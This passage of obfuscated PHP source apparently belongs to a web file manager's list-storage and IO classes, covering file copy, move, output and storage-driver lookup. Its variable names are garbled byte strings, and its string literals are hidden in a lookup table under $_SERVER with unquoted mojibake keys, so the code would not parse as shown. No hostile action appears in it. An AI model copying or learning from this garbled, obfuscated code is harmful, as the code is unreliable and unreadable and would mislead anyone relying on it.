return array_sort_by($âÇ÷¸Ø‡, $¤”Ÿƒ¸‚, $¡å‘Šá¤); } return $âÇ÷¸Ø‡[$_SERVER[íû‘ş´][440] . $á¶˜ô¨ ]; } public function insert($ÎÇæ¬ş‘) { $šŒ¶«ŒÊ =& $_SERVER[íû‘ş´]; $ÎÇæ¬ş‘ = array_field_key($ÎÇæ¬ş‘, $this->field); $¬Ğ¹‚Å´ = Model($this->modelType)->get($šŒ¶«ŒÊ[441], $this->optionType . $šŒ¶«ŒÊ[442]); $¬Ğ¹‚Å´ = $¬Ğ¹‚Å´ ? $¬Ğ¹‚Å´ : 0; $ÎÇæ¬ş‘[$šŒ¶«ŒÊ[443]] = ++$¬Ğ¹‚Å´; $ÎÇæ¬ş‘[$šŒ¶«ŒÊ[215]] = time(); $ÎÇæ¬ş‘[$šŒ¶«ŒÊ[85]] = time(); Model($this->modelType)->set($šŒ¶«ŒÊ[441], $¬Ğ¹‚Å´, $this->optionType . $šŒ¶«ŒÊ[442]); Model($this->modelType)->set($šŒ¶«ŒÊ[440] . $¬Ğ¹‚Å´, $ÎÇæ¬ş‘, $this->optionType); return $¬Ğ¹‚Å´; } public function update($æ‹¶«Úò, $ŸîÎ‹Ê) { $Ç‰àÂç‹ =& $_SERVER[íû‘ş´]; $ŸîÎ‹Ê = array_field_key($ŸîÎ‹Ê, $this->field); $¬Ö£Á’¶ = $this->listData($æ‹¶«Úò); if (!$¬Ö£Á’¶ || !$æ‹¶«Úò) { return !1; } $ŸîÎ‹Ê = array_merge($¬Ö£Á’¶, $ŸîÎ‹Ê); $ŸîÎ‹Ê[$Ç‰àÂç‹[85]] = time(); return Model($this->modelType)->set($Ç‰àÂç‹[440] . $æ‹¶«Úò, $ŸîÎ‹Ê, $this->optionType); } public function remove($—µØÍ‡‘) { if (!$—µØÍ‡‘) { return !1; } return Model($this->modelType)->remove($_SERVER[íû‘ş´][440] . $—µØÍ‡‘, $this->optionType); } public function clear() { $²èš¢“ =& $_SERVER[íû‘ş´]; Model($this->modelType)->remove($²èš¢“[441], $this->optionType . $²èš¢“[442]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($åğÁ÷âá, $óº¶—Æä) { if (!$óº¶—Æä) { return !1; } $³ÍâÍĞœ = $this->listData(); $³ÍâÍĞœ = array_to_keyvalue($³ÍâÍĞœ, $åğÁ÷âá); return isset($³ÍâÍĞœ[$óº¶—Æä]) ? $³ÍâÍĞœ[$óº¶—Æä] : !1; } public function findByName($øöùÑ…Ü) { return $this->findByKey($_SERVER[íû‘ş´][32], $øöùÑ…Ü); } protected function resetData($¾è¬²İ) { $·‘¦äè =& $_SERVER[íû‘ş´]; $¾è¬²İ = is_array($¾è¬²İ) ? $¾è¬²İ : array(); $ôâŸ—ãĞ = array(); for ($ë úñ¾’ = 0; $ë úñ¾’ < count($¾è¬²İ); $ë úñ¾’++) { $ôâŸ—ãĞ[$·‘¦äè[440] . $¾è¬²İ[$ë úñ¾’][$·‘¦äè[443]]] = $¾è¬²İ[$ë úñ¾’]; } return Model($this->modelType)->set($ôâŸ—ãĞ, !1, $this->optionType); } private function getAutoName($¾ »Ôõ‹) { $œûÌìû˜ = array_to_keyvalue($this->listData(), $_SERVER[íû‘ş´][32]); if (!$œûÌìû˜ || !isset($œûÌìû˜[$¾ »Ôõ‹])) { return $¾ »Ôõ‹; } for ($Öé­ûÀÚ = 1; $Öé­ûÀÚ < count($œûÌìû˜); $Öé­ûÀÚ++) { $ÀõÙ¼Ô = $¾ »Ôõ‹ . "\x28{$Öé­ûÀÚ}\x29"; if (!isset($œûÌìû˜[$ÀõÙ¼Ô])) { return $ÀõÙ¼Ô; } } return $ÀõÙ¼Ô; } } goto A¡¸Ê–…‡; D†îÇ««—ß: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ö­£ç¨, $œó•©Ôµ) { $§ş–¤Ó¾ =& $_SERVER[íû‘ş´]; $„ªË¼„ = $œó•©Ôµ; $GLOBALS[$§ş–¤Ó¾[1204]] = $§ş–¤Ó¾[1205] . $ö­£ç¨; Hook::trigger($§ş–¤Ó¾[1205] . $ö­£ç¨ . $§ş–¤Ó¾[1206], $„ªË¼„); $ø¡Õ“­ = self::driverMake($œó•©Ôµ[0]); if (!$ø¡Õ“­) { return !1; } if (method_exists($ø¡Õ“­, $ö­£ç¨)) { $—Ò×«ñá = @call_user_func_array(array($ø¡Õ“­, $ö­£ç¨), $œó•©Ôµ); } else { if (method_exists($ø¡Õ“­, $§ş–¤Ó¾[1207])) { $—Ò×«ñá = @call_user_func_array(array($ø¡Õ“­, $ö­£ç¨), $œó•©Ôµ); } else { if (method_exists(self, $ö­£ç¨)) { $—Ò×«ñá = @call_user_func_array(array(self, $ö­£ç¨), $œó•©Ôµ); } else { $—Ò×«ñá = call_user_func_array(array(parent, $ö­£ç¨), $œó•©Ôµ); } } } Hook::trigger($§ş–¤Ó¾[1205] . $ö­£ç¨ . $§ş–¤Ó¾[1208], $„ªË¼„, $—Ò×«ñá); return $—Ò×«ñá; } public static function init($‘¤äæšˆ) { return self::driverMake($‘¤äæšˆ); } public static function copy($³½Û³³¦, $øšãËÙÇ, $ÜãÔ”— = false, $ëçËãŸ = false) { return self::copyMoveStart($³½Û³³¦, $øšãËÙÇ, $ÜãÔ”—, $_SERVER[íû‘ş´][596], $ëçËãŸ); } public static function move($ÒØ›è¤Ÿ, $–èÉ­Øˆ, $úöâÄÀ = false, $ÑòéÛó = false) { return self::copyMoveStart($ÒØ›è¤Ÿ, $–èÉ­Øˆ, $úöâÄÀ, $_SERVER[íû‘ş´][598], $ÑòéÛó); } private static function copyMoveStart($üŸš‚Å·, $×¥ß×§Ó, $ÀÎ„¶Âô, $ÏÏ¢Â¤, $Ûñˆ©¶´) { $ÙıèªÑ’ =& $_SERVER[íû‘ş´]; $îÀçˆ³ = array($üŸš‚Å·, $×¥ß×§Ó, $ÀÎ„¶Âô, $Ûñˆ©¶´); Hook::trigger($ÙıèªÑ’[1205] . $ÏÏ¢Â¤ . $ÙıèªÑ’[1206], $îÀçˆ³); $ûèÛ¢ = self::copyMove($üŸš‚Å·, $×¥ß×§Ó, $ÀÎ„¶Âô, $ÏÏ¢Â¤, $Ûñˆ©¶´); Hook::trigger($ÙıèªÑ’[1205] . $ÏÏ¢Â¤ . $ÙıèªÑ’[1208], $îÀçˆ³, $ûèÛ¢); return $ûèÛ¢; } public static function saveFile($÷¼·º›Ï, $Ò¦ÓúÃ, $ë›¦Í‚ğ = true) { $ïå‚Ë…¼ =& $_SERVER[íû‘ş´]; $­÷¹ßë = self::info($Ò¦ÓúÃ); $øÌ–‡ò† = self::driverMake($÷¼·º›Ï); $—¨ÊçÇ = self::driverMake($Ò¦ÓúÃ); $ëê‚×¼õ = !1; if ($—¨ÊçÇ->pathParse[$ïå‚Ë…¼[1209]]) { $ëê‚×¼õ = $—¨ÊçÇ; $€±Ò¶Ãš = $—¨ÊçÇ->pathParse[$ïå‚Ë…¼[1209]]; $—¨ÊçÇ = self::driverMake($€±Ò¶Ãš); } if ($øÌ–‡ò†->pathParse[$ïå‚Ë…¼[1209]]) { $ë ­¾°æ = $øÌ–‡ò†->pathParse[$ïå‚Ë…¼[1209]]; $øÌ–‡ò† = self::driverMake($ë ­¾°æ); } $¾º¿˜ñ– = $—¨ÊçÇ->pathFather($Ò¦ÓúÃ); $ÒµêùÆ = !0; if (!$ë›¦Í‚ğ && self::driverIsSame($øÌ–‡ò†, $—¨ÊçÇ)) { $ÒµêùÆ = !1; } $÷ôÙ‹”ä = self::copyFile($øÌ–‡ò†, $÷¼·º›Ï, $—¨ÊçÇ, $¾º¿˜ñ–, $­÷¹ßë[$ïå‚Ë…¼[32]], $ÒµêùÆ); if ($ëê‚×¼õ) { $÷ôÙ‹”ä = $ëê‚×¼õ->getPathOuter($÷ôÙ‹”ä); } return $÷ôÙ‹”ä; } private static function copyMove($ºÚ™û’Û, $ËµÆ…¤ê, $üÏ¡‹í˜, $¶æ­®ã, $½ÓÌäœ© = false) { $Íƒ“‚ß¨ =& $_SERVER[íû‘ş´]; if (!$ºÚ™û’Û || $ºÚ™û’Û == $Íƒ“‚ß¨[8] || !$ËµÆ…¤ê) { return !1; } ignore_timeout(); $ÊˆÒÛĞ = self::driverMake($ºÚ™û’Û); $¯¤»ôæš = self::driverMake($ËµÆ…¤ê); $‹½Ğ†§Ö = $¶æ­®ã == $Íƒ“‚ß¨[598]; $ª¬ƒã‡‡ = !1; if ($¯¤»ôæš->pathParse[$Íƒ“‚ß¨[1209]]) { $ª¬ƒã‡‡ = $¯¤»ôæš; $ËµÆ…¤ê = $¯¤»ôæš->pathParse[$Íƒ“‚ß¨[1209]]; $¯¤»ôæš = self::driverMake($ËµÆ…¤ê); } if ($ÊˆÒÛĞ->pathParse[$Íƒ“‚ß¨[1209]]) { $ºÚ™û’Û = $ÊˆÒÛĞ->pathParse[$Íƒ“‚ß¨[1209]]; $ÊˆÒÛĞ = self::driverMake($ºÚ™û’Û); } self::check($ÊˆÒÛĞ, $ºÚ™û’Û, $¯¤»ôæš, $ËµÆ…¤ê); Hook::trigger($Íƒ“‚ß¨[1210], $ÊˆÒÛĞ, $ºÚ™û’Û, $¯¤»ôæš, $ËµÆ…¤ê); $ş·…ïç‘ = self::driverIsSame($ÊˆÒÛĞ, $¯¤»ôæš); if ($ş·…ïç‘) { if ($¶æ­®ã == $Íƒ“‚ß¨[598] && !method_exists($¯¤»ôæš, $Íƒ“‚ß¨[1211]) && trim($ËµÆ…¤ê, $Íƒ“‚ß¨[8]) == trim($¯¤»ôæš->pathFather($ºÚ™û’Û), $Íƒ“‚ß¨[8])) { if ($ÊˆÒÛĞ->pathThis($ºÚ™û’Û) != $½ÓÌäœ© && !$ÊˆÒÛĞ->isTypeObject()) { return $ÊˆÒÛĞ->rename($ºÚ™û’Û, $½ÓÌäœ©); } return $¯¤»ôæš->getPathOuter($ºÚ™û’Û); } if (method_exists($¯¤»ôæš, $¶æ­®ã)) { return $¯¤»ôæš->{$¶æ­®ã}($ºÚ™û’Û, $ËµÆ…¤ê, $üÏ¡‹í˜, $½ÓÌäœ©); } } if ($ş·…ïç‘ && $¶æ­®ã == $Íƒ“‚ß¨[598] && $¯¤»ôæš->getType() == $Íƒ“‚ß¨[106]) { $çùêü· = $¯¤»ôæš->movePath($ºÚ™û’Û, $ËµÆ…¤ê, $½ÓÌäœ©); if ($çùêü·) { return $çùêü·; } } $î•è¸êĞ = $ÊˆÒÛĞ->isFile($ºÚ™û’Û); if (!$î•è¸êĞ && $¯¤»ôæš->getType() == $Íƒ“‚ß¨[816] && $ÊˆÒÛĞ->getType() == $Íƒ“‚ß¨[106]) { $çùêü· = $¯¤»ôæš->copyFolderFromIO($ÊˆÒÛĞ, $ºÚ™û’Û, $ËµÆ…¤ê, $üÏ¡‹í˜, $‹½Ğ†§Ö, $½ÓÌäœ©); } else { $çùêü· = self::copyPath($ÊˆÒÛĞ, $ºÚ™û’Û, $¯¤»ôæš, $ËµÆ…¤ê, $üÏ¡‹í˜, $‹½Ğ†§Ö, $î•è¸êĞ, $½ÓÌäœ©); } if ($çùêü· && $‹½Ğ†§Ö) { $ÊˆÒÛĞ->remove($ºÚ™û’Û); } if ($ª¬ƒã‡‡) { $çùêü· = $ª¬ƒã‡‡->getPathOuter($çùêü·); } return $çùêü·; } private static function check($Èú¦†¹—, $‰®ãèóÌ, $À­û¿ ¨, &$ˆóÂ“») { $«Ş®Ú§ª =& $_SERVER[íû‘ş´]; if (self::driverIsSame($Èú¦†¹—, $À­û¿ ¨) && $Èú¦†¹—->isFolder($‰®ãèóÌ) && $Èú¦†¹—->isParentOf($‰®ãèóÌ, $ˆóÂ“»)) { show_json(LNG($«Ş®Ú§ª[1212]), !1); } if (!$Èú¦†¹—->exist($‰®ãèóÌ)) { show_json(LNG($«Ş®Ú§ª[105]), !1); } } private static function copyPath($šÓ‡ñ¨•, $¨¡ù°Â†, $Å»§§É¼, $­³à¼ç, $ÍÍÔ…Í, $é¦Á’Šò, $à¤µÇÊñ, $ÁƒÙÊ´» = false, $ïñú¢´ = true) { $¡Îï‚àõ =& $_SERVER[íû‘ş´]; $ÀßÈ—øæ = empty($ÁƒÙÊ´») && $ÁƒÙÊ´» !== $¡Îï‚àõ[212] ? $šÓ‡ñ¨•->pathThis($¨¡ù°Â†) : $ÁƒÙÊ´»; if ($ÍÍÔ…Í) { $¹»†ş·õ = $Å»§§É¼->fileNameExist($­³à¼ç, $ÀßÈ—øæ); $ÂÀÇş‘Æ = $ÀßÈ—øæ; $ÀßÈ—øæ = $Å»§§É¼->fileNameAuto($­³à¼ç, $ÀßÈ—øæ, $ÍÍÔ…Í, !$à¤µÇÊñ); if (!$¹»†ş·õ || $ÂÀÇş‘Æ != $ÀßÈ—øæ) { $ÍÍÔ…Í = !1; } if ($ïñú¢´ && !$ÍÍÔ…Í) { $Å»§§É¼->_data[$¡Îï‚àõ[1213]] = !0; } } if ($à¤µÇÊñ) { return self::copyFile($šÓ‡ñ¨•, $¨¡ù°Â†, $Å»§§É¼, $­³à¼ç, $ÀßÈ—øæ, $é¦Á’Šò); } if ($ÍÍÔ…Í == REPEAT_RENAME_FOLDER) { $ÍÍÔ…Í = !1; } $İ·ã¬Œµ = rtrim($­³à¼ç, $¡Îï‚àõ[8]) . $¡Îï‚àõ[8] . $ÀßÈ—øæ; $ø§ú¶„ß = $Å»§§É¼->mkdir($Å»§§É¼->getPath($İ·ã¬Œµ), $ÍÍÔ…Í); $­³à¼ç = $Å»§§É¼->getPathInner($ø§ú¶„ß); $Õê½Ä¨§ = $šÓ‡ñ¨•->listPath($¨¡ù°Â†, !0); $Õê½Ä¨§ = is_array($Õê½Ä¨§) ? $Õê½Ä¨§ : array($¡Îï‚àõ[83] => array(), $¡Îï‚àõ[82] => array()); $Ø„‰Š ¹ = array_merge($Õê½Ä¨§[$¡Îï‚àõ[83]], $Õê½Ä¨§[$¡Îï‚àõ[82]]); foreach ($Ø„‰Š ¹ as $…ı›»„–) { $ù¶Ÿ—Ùƒ = $…ı›»„–[$¡Îï‚àõ[33]] == $¡Îï‚àõ[214]; $¨¡ù°Â† = $šÓ‡ñ¨•->getPathInner($…ı›»„–[$¡Îï‚àõ[84]]); $œêŒ¸á = self::copyPath($šÓ‡ñ¨•, $¨¡ù°Â†, $Å»§§É¼, $­³à¼ç, $ÍÍÔ…Í, $é¦Á’Šò, $ù¶Ÿ—Ùƒ, !1, !1); if (!$œêŒ¸á) { IO::errorTips($¡Îï‚àõ[1214] . $¨¡ù°Â† . $¡Îï‚àõ[70] . $­³à¼ç); } } self::copyMoveKeepInfo($šÓ‡ñ¨•, $¨¡ù°Â†, $ø§ú¶„ß); return $ø§ú¶„ß; } private static function copyFile($ö…Ùüì°, $ÚšİÍÙ, $¿ÌóŞ„±, $ÙÉ¦š¢Œ, $ŠéµãæÃ, $¿á´Åô) { $°ô“Ì¬ =& $_SERVER[íû‘ş´]; $ÙÉ¦š¢Œ = $¿ÌóŞ„±->getPath(rtrim($ÙÉ¦š¢Œ, $°ô“Ì¬[8]) . $°ô“Ì¬[8] . $ŠéµãæÃ); $óÏ›’öƒ = $°ô“Ì¬[1215] . time() . rand_string(5); Hook::trigger($°ô“Ì¬[1216], $ö…Ùüì°, $ÚšİÍÙ, $¿ÌóŞ„±, $ÙÉ¦š¢Œ, $ŠéµãæÃ, $óÏ›’öƒ); if (self::driverIsSame($ö…Ùüì°, $¿ÌóŞ„±)) { if ($¿á´Åô) { $¸©Ïú²ä = $¿ÌóŞ„±->moveFile($ÚšİÍÙ, $ÙÉ¦š¢Œ); } else { $¸©Ïú²ä = $¿ÌóŞ„±->copyFile($ÚšİÍÙ, $ÙÉ¦š¢Œ); } Hook::trigger($°ô“Ì¬[1217], $ö…Ùüì°, $ÚšİÍÙ, $¿ÌóŞ„±, $ÙÉ¦š¢Œ, $ŠéµãæÃ, $¸©Ïú²ä); self::copyMoveKeepInfo($ö…Ùüì°, $ÚšİÍÙ, $¸©Ïú²ä); return $¸©Ïú²ä; } $ºèû“İÖ = TEMP_FILES; if ($GLOBALS[$°ô“Ì¬[6]][$°ô“Ì¬[89]][$°ô“Ì¬[855]]) { $ºèû“İÖ = $GLOBALS[$°ô“Ì¬[6]][$°ô“Ì¬[89]][$°ô“Ì¬[855]]; } $Ô”ÜñËÅ = $ºèû“İÖ; mk_dir($Ô”ÜñËÅ); $œ÷äá¥– = $Ô”ÜñËÅ . $óÏ›’öƒ; $Ò‡ŒŸÓó = $œ÷äá¥–; $œ÷äá¥– = $ö…Ùüì°->download($ÚšİÍÙ, $œ÷äá¥–); $œ÷äá¥– = $ö…Ùüì°->iconvApp($œ÷äá¥–); if (substr($œ÷äá¥–, strlen($ºèû“İÖ)) == $ºèû“İÖ) { $¿á´Åô = !0; } $¸©Ïú²ä = $¿ÌóŞ„±->upload($ÙÉ¦š¢Œ, $œ÷äá¥–, $¿á´Åô); self::remove($Ò‡ŒŸÓó); Hook::trigger($°ô“Ì¬[1217], $ö…Ùüì°, $ÚšİÍÙ, $¿ÌóŞ„±, $ÙÉ¦š¢Œ, $ŠéµãæÃ, $¸©Ïú²ä); self::copyMoveKeepInfo($ö…Ùüì°, $ÚšİÍÙ, $¸©Ïú²ä); return $¸©Ïú²ä; } private static function copyMoveKeepInfo($º–¨·ÄÂ, $ºˆ‡ìÍ, $©½‡œ£Ï) { if (!$©½‡œ£Ï) { return; } $Ì°´ß¬À = $º–¨·ÄÂ->info($ºˆ‡ìÍ); if (!is_array($Ì°´ß¬À)) { return; } IO::setModifyTime($©½‡œ£Ï, $Ì°´ß¬À[$_SERVER[íû‘ş´][85]]); } public static function pathFather($¨Ş›åÀÄ) { $•‰âÙµ¸ = IO::init($¨Ş›åÀÄ); $íÉàñ› = $•‰âÙµ¸->pathFather($•‰âÙµ¸->path); return $•‰âÙµ¸->getPathOuter($íÉàñ›); } public static function fileOut($İ×³ÙæÄ, $¯¨Áí• = false, $’ÛóˆŒ = false, $ÖÇÄºû² = '') { $ñ„ÌŞ¸Ö = self::driverMake($İ×³ÙæÄ); if ($ñ„ÌŞ¸Ö->isFileOutServer()) { return $ñ„ÌŞ¸Ö->fileOutServer($İ×³ÙæÄ, $¯¨Áí•, $’ÛóˆŒ, $ÖÇÄºû²); } return $ñ„ÌŞ¸Ö->fileOut($İ×³ÙæÄ, $¯¨Áí•, $’ÛóˆŒ, $ÖÇÄºû²); } public static function fileOutImage($±†¹µ“å, $ÒÄ§öü© = 250) { $®¿é„÷¥ = array(250, 600, 1200, 2000, 3000, 5000); for ($ÂÜœµ«È = 0; $ÂÜœµ«È < count($®¿é„÷¥); $ÂÜœµ«È++) { if ($ÂÜœµ«È == 0 && $ÒÄ§öü© <= $®¿é„÷¥[$ÂÜœµ«È]) { $ÒÄ§öü© = $®¿é„÷¥[$ÂÜœµ«È]; break; } else { if ($ÒÄ§öü© > $®¿é„÷¥[$ÂÜœµ«È - 1] && $ÒÄ§öü© <= $®¿é„÷¥[$ÂÜœµ«È]) { $ÒÄ§öü© = $®¿é„÷¥[$ÂÜœµ«È]; break; } else { if ($ÂÜœµ«È == count($®¿é„÷¥) - 1 && $ÒÄ§öü© > $®¿é„÷¥[$ÂÜœµ«È]) { $ÒÄ§öü© = $®¿é„÷¥[$ÂÜœµ«È]; break; } } } } $çúÓ©¸  = self::driverMake($±†¹µ“å); if ($çúÓ©¸ ->isFileOutServer()) { return $çúÓ©¸ ->fileOutImageServer($±†¹µ“å, $ÒÄ§öü©); } return $çúÓ©¸ ->fileOutImage($±†¹µ“å, $ÒÄ§öü©); } private static function driverIsSame($¸‡ñŒÔÙ, $¯ÂÔÉğÏ) { $ş¸¥ƒí± =& $_SERVER[íû‘ş´]; $–Í“§ÀÛ = $¸‡ñŒÔÙ->getType(); $ŞÑéü¦ = $¯ÂÔÉğÏ->getType(); if ($–Í“§ÀÛ != $ŞÑéü¦) { return !1; } if ($–Í“§ÀÛ == $ş¸¥ƒí±[816]) { return !0; } if ($–Í“§ÀÛ == $ş¸¥ƒí±[106]) { return !0; } if ($¸‡ñŒÔÙ->pathDriver == $¯ÂÔÉğÏ->pathDriver) { return !0; } return !1; } public static function copyUpdate($êÖñ”’, $”®½Çì×) { $«Ã‡Àâˆ =& $_SERVER[íû‘ş´]; if (!IO::exist($êÖñ”’)) { return !1; } if (!IO::exist($”®½Çì×)) { IO::mkdir($”®½Çì×); } $ş˜çïíı = array_to_keyvalue(self::listAllSimple($êÖñ”’), $«Ã‡Àâˆ[84]); $äÓÓÊ¸ = array_to_keyvalue(self::listAllSimple($”®½Çì×), $«Ã‡Àâˆ[84]); $¤ äØÙ = array(); $ø¯§ËÆÛ = array(); foreach ($ş˜çïíı as $’ëÃŸ¤ => $ ˆ“¨†®) { if (isset($äÓÓÊ¸[$’ëÃŸ¤])) { if ($ ˆ“¨†®[$«Ã‡Àâˆ[75]] == 1) { continue; } if ($äÓÓÊ¸[$’ëÃŸ¤][$«Ã‡Àâˆ[76]] == $ ˆ“¨†®[$«Ã‡Àâˆ[76]]) { continue; } } if ($ ˆ“¨†®[$«Ã‡Àâˆ[75]] == 1) { $ø¯§ËÆÛ[] = $”®½Çì× . $«Ã‡Àâˆ[8] . trim($’ëÃŸ¤, $«Ã‡Àâˆ[8]); continue; } $–È®Æô€ = strstr(trim($’ëÃŸ¤, $«Ã‡Àâˆ[8]), $«Ã‡Àâˆ[8]) ? get_path_father($’ëÃŸ¤) : $«Ã‡Àâˆ[12]; $¤ äØÙ[] = array($«Ã‡Àâˆ[1218] => $ ˆ“¨†®[$«Ã‡Àâˆ[86]], $«Ã‡Àâˆ[1219] => rtrim($”®½Çì×, $«Ã‡Àâˆ[8]) . $«Ã‡Àâˆ[8] . $–È®Æô€, $«Ã‡Àâˆ[1220] => $ ˆ“¨†®); } $¹´ã­Í = array($«Ã‡Àâˆ[214] => $¤ äØÙ, $«Ã‡Àâˆ[75] => $ø¯§ËÆÛ); Hook::trigger($«Ã‡Àâˆ[1221], $êÖñ”’, $”®½Çì×, $¹´ã­Í); foreach ($ø¯§ËÆÛ as $ ˆ“¨†®) { IO::mkdir($ ˆ“¨†®); } foreach ($¤ äØÙ as $ ˆ“¨†®) { IO::copy($ ˆ“¨†®[$«Ã‡Àâˆ[1218]], $ ˆ“¨†®[$«Ã‡Àâˆ[1219]], REPEAT_REPLACE); } } public static function fileSubstr($¸”ûÚ‰, $¡–ìš˜ë, $ ³¨ÏÀü = false) { $›ª„ÑÃ =& $_SERVER[íû‘ş´]; $óåĞßç = self::driverMake($¸”ûÚ‰); $ÖÃ†ØÏ¹ = $óåĞßç->size($¸”ûÚ‰); $»ÍÙ§Â• = $¡–ìš˜ë; $®¦£Ú¦ü = $ ³¨ÏÀü; if ($¡–ìš˜ë < 0) { $¡–ìš˜ë = $ÖÃ†ØÏ¹ + $¡–ìš˜ë; } if ($ ³¨ÏÀü === !1) { $ ³¨ÏÀü = $ÖÃ†ØÏ¹ - $¡–ìš˜ë; } if ($¡–ìš˜ë + $ ³¨ÏÀü > $ÖÃ†ØÏ¹) { $ ³¨ÏÀü = $ÖÃ†ØÏ¹ - $¡–ìš˜ë; } if (!$ÖÃ†ØÏ¹ && $óåĞßç->getType() == $›ª„ÑÃ[106] && !$óåĞßç->exist($¸”ûÚ‰)) { $–‹Á–¡ = get_path_this($¸”ûÚ‰); $µÃã„× = parse_url_query($–‹Á–¡); if (is_array($µÃã„×) && isset($µÃã„×[$›ª„ÑÃ[32]])) { $–‹Á–¡ = urldecode($µÃã„×[$›ª„ÑÃ[32]]); } throw new Exception($›ª„ÑÃ[1222] . LNG($›ª„ÑÃ[1223]) . $›ª„ÑÃ[1024] . clear_html($–‹Á–¡) . $›ª„ÑÃ[12]); } if ($ ³¨ÏÀü <= 0) { return $›ª„ÑÃ[12]; } if ($¡–ìš˜ë < 0 || $¡–ìš˜ë >= $ÖÃ†ØÏ¹ || $ ³¨ÏÀü > 1024 * 1024 * 10) { throw new Exception("\x66\x69\154\x65\122\x65\x61\x64\x20\x65\162\162\x6f\162\x21\40\163\164\x61\162\164\75{$¡–ìš˜ë}\x3b\154\x65\x6e\x67\164\x68\75{$ ³¨ÏÀü}\73\x20\x73\151\x7a\145\75{$ÖÃ†ØÏ¹}\73"); } $—˜ìÃ´§ = $óåĞßç->fileSubstr($¸”ûÚ‰, $¡–ìš˜ë, $ ³¨ÏÀü); if (!$—˜ìÃ´§ && $ ³¨ÏÀü && isset($GLOBALS[$›ª„ÑÃ[1224]])) { throw new Exception($GLOBALS[$›ª„ÑÃ[1224]][$›ª„ÑÃ[1225]]); } return $—˜ìÃ´§; } private static function driverMake(&$Ä„ı°Ç¥) { $÷úıü =& $_SERVER[íû‘ş´]; $Ä¸ñÂï‘ = KodIO::parse($Ä„ı°Ç¥); if (!self::$driverListSystem) { $¥¡îï‹ì = Model($÷úıü[826])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¥¡îï‹ì, $÷úıü[443]); } if ($Ä¸ñÂï‘[$÷úıü[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Ä¸ñÂï‘[$÷úıü[443]]]) { return !1; } $Ä„ı°Ç¥ = $Ä¸ñÂï‘[$÷úıü[1226]]; $Ñ©—¯Å = self::driverGet($Ä¸ñÂï‘, $Ä„ı°Ç¥); return $Ñ©—¯Å; } private static function driverGet($‚çÎÇôœ, &$ÊÀĞÌ‘) { $¤è§ôÛŒ =& $_SERVER[íû‘ş´]; $óŠÄÆÓá = $‚çÎÇôœ[$¤è§ôÛŒ[1227]]; $ñíïÖŸ = $‚çÎÇôœ[$¤è§ôÛŒ[443]]; switch ($‚çÎÇôœ[$¤è§ôÛŒ[33]]) { case KodIO::KOD_IO: $™¦¿Èñ× = self::$driverListSystem[$ñíïÖŸ]; break; case KodIO::KOD_SOURCE: $ÊÀĞÌ‘ = $ñíïÖŸ . $ÊÀĞÌ‘; $™¦¿Èñ× = array($¤è§ôÛŒ[1228] => $¤è§ôÛŒ[1229], $¤è§ôÛŒ[6] => $‚çÎÇôœ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $×ÑŸ¸Ğ = $GLOBALS[$¤è§ôÛŒ[1230]]; self::$driverListUser = array_to_keyvalue($×ÑŸ¸Ğ, $¤è§ôÛŒ[443]); } $™¦¿Èñ× = self::$driverListUser[$ñíïÖŸ]; break; case KodIO::KOD_SHARE_LINK: $™¦¿Èñ× = array($¤è§ôÛŒ[1228] => $¤è§ôÛŒ[1231], $¤è§ôÛŒ[6] => $‚çÎÇôœ); $ƒ¼©¸Œû = Action($¤è§ôÛŒ[1232])->sharePathInfo($‚çÎÇôœ[$¤è§ôÛŒ[84]]); $ÊÀĞÌ‘ = $ƒ¼©¸Œû[$¤è§ôÛŒ[181]]; if (!$ƒ¼©¸Œû[$¤è§ôÛŒ[181]]) { $Çí”ûŞƒ = Model($¤è§ôÛŒ[642])->getInfo($ƒ¼©¸Œû[$¤è§ôÛŒ[643]]); $ÊÀĞÌ‘ = KodIO::clear($Çí”ûŞƒ[$¤è§ôÛŒ[1233]] . $‚çÎÇôœ[$¤è§ôÛŒ[1226]]); $‚çÎÇôœ[$¤è§ôÛŒ[538]] = $Çí”ûŞƒ; $‚çÎÇôœ[$¤è§ôÛŒ[1209]] = $ÊÀĞÌ‘; $™¦¿Èñ× = array($¤è§ôÛŒ[1228] => $¤è§ôÛŒ[1234], $¤è§ôÛŒ[6] => $‚çÎÇôœ); } break; case KodIO::KOD_SHARE_ITEM: $™¦¿Èñ× = array($¤è§ôÛŒ[1228] => $¤è§ôÛŒ[1235], $¤è§ôÛŒ[6] => $‚çÎÇôœ); $Çí”ûŞƒ = Model($¤è§ôÛŒ[642])->getInfo($‚çÎÇôœ[$¤è§ôÛŒ[443]]); if ($Çí”ûŞƒ[$¤è§ôÛŒ[181]] == $¤è§ôÛŒ[212]) { $ÊÀĞÌ‘ = KodIO::clear($Çí”ûŞƒ[$¤è§ôÛŒ[1233]] . $‚çÎÇôœ[$¤è§ôÛŒ[1226]]); $‚çÎÇôœ[$¤è§ôÛŒ[538]] = $Çí”ûŞƒ; $‚çÎÇôœ[$¤è§ôÛŒ[1209]] = $ÊÀĞÌ‘; $™¦¿Èñ× = array($¤è§ôÛŒ[1228] => $¤è§ôÛŒ[1236], $¤è§ôÛŒ[6] => $‚çÎÇôœ); } else { if (!$ÊÀĞÌ‘) { $ÊÀĞÌ‘ = $Çí”ûŞƒ[$¤è§ôÛŒ[181]]; } } break; default: $ÊÀĞÌ‘ = $‚çÎÇôœ[$¤è§ôÛŒ[84]]; $™¦¿Èñ× = array($¤è§ôÛŒ[1228] => $¤è§ôÛŒ[1237]); break; } $ìº¶Õ§ü = $‚çÎÇôœ[$¤è§ôÛŒ[84]]; if (!isset(self::$driverCache[$ìº¶Õ§ü])) { $ÙÚâúÉØ = strtolower($™¦¿Èñ×[$¤è§ôÛŒ[95]]); $íÏÚÚÔ = $GLOBALS[$¤è§ôÛŒ[6]][$¤è§ôÛŒ[89]][$¤è§ôÛŒ[885]]; $ş·Íå  = $¤è§ôÛŒ[74] . (isset($íÏÚÚÔ[$ÙÚâúÉØ]) ? $íÏÚÚÔ[$ÙÚâúÉØ] : ucfirst($ÙÚâúÉØ)); if (!class_exists($ş·Íå )) { show_json("{$ş·Íå }\x20\x6e\x6f\x74\x20\x65\170\x69\163\x74\x73\x21", !1); } $›£ÂÚŠ³ = isset($™¦¿Èñ×[$¤è§ôÛŒ[6]]) ? $™¦¿Èñ×[$¤è§ôÛŒ[6]] : !1; 